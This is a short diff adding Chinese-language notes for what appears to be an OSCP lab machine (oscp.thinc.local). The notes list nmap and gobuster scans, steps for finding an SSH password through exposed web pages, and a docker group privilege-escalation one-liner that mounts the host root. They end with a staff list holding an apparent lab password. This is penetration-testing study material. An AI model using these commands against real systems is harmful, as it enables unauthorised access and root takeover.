@@ -1,0 +1,31 @@
+nmap -sV -sC -Pn 10.11.1.101 > nmap.txt
+
+gobuster dir  -u http://oscp.thinc.local/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,cgi > gobuster.txt
+
+
+1.nmap掃描到80端口可以直接打開,並且發現passwords路徑可以訪問,發現有4個頁面
+2.第一個提示出生年份,在主頁面可以查看到四個人的出生年份
+3.alfred可以成功登入並看到ssh密碼
+4.ssh登入後取得shell,使用LinEnum.sh查看是docker的group用戶
+5.google docker privilege escalation
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+Administrator:
+Name: Walter
+E-mail: walter@oscp.thinc.local
+Year of birth: 1982
+
+Developer:
+Name: Alfred IHopeThisDoesNotExpire
+E-mail: alfred@oscp.thinc.local
+Year of birth: 1988
+
+Web Developer:
+Name: Cory
+E-mail: cory@oscp.thinc.local
+Year of birth: 1985
+
+Writer:
+Name: Jasmine
+E-mail: jasmine@oscp.thinc.local
+Year of birth: 1983
